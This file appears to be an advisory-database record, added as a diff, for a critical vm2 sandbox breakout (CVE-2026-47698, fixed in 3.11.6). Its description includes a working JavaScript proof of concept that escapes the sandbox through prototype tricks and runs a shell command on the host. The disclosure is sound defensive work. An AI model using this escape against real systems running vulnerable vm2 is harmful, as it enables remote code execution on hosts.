@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-08-17T17:32:42Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 410972,
+    "Id": "GSA_kwCzR0hTQS1jZmN3LXhwNngtMjVnas4ABkVc",
+    "GhsaId": "GHSA-cfcw-xp6x-25gj",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-cfcw-xp6x-25gj"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/3.11.6"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-cfcw-xp6x-25gj"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-cfcw-xp6x-25gj"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-47698"
+      }
+    ],
+    "Description": "### Summary\n\nVM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nThe fix for https://github.com/patriksimek/vm2/security/advisories/GHSA-v6mx-mf47-r5wg is insufficient and can be bypassed by replacing `indirectcall.call(dangerousmutator, ...)` with `indirectcall.call(indirectcall, dangerousmutator, ...)` since indirect calls are not seen as dangerous.\n\n### PoC\n\n```js\nconst {VM} = require(\".\");\nconst vm = new VM();\nconsole.log(vm.run(`\nconst getProto = Buffer.call.call(Buffer.call, {}.__lookupGetter__, Buffer, \"__proto__\");\nconst setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, \"__proto__\");\n\nasync function f() {\n  try {\n    await WebAssembly.compileStreaming();\n  } catch(e) {\n    Buffer.call.call(Buffer.call, setProto, Buffer.call.call(Buffer.call, getProto, e), null);\n  }\n\n  try {\n    await WebAssembly.compileStreaming();\n  } catch(e) {\n    e.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch pwned');\n  }\n}\n\nf();\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under the assumption that the attacker can run arbitrary code execution inside the context of a vm2 sandbox.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-08-17T17:32:41Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2: Sandbox Breakout Using Dangerous Host Proto Mutators",
+    "UpdatedAt": "2026-08-17T17:49:06Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.6"
+      },
+      "VulnerableVersionRange": "\u003c= 3.11.5"
+    }
+  ]
+}
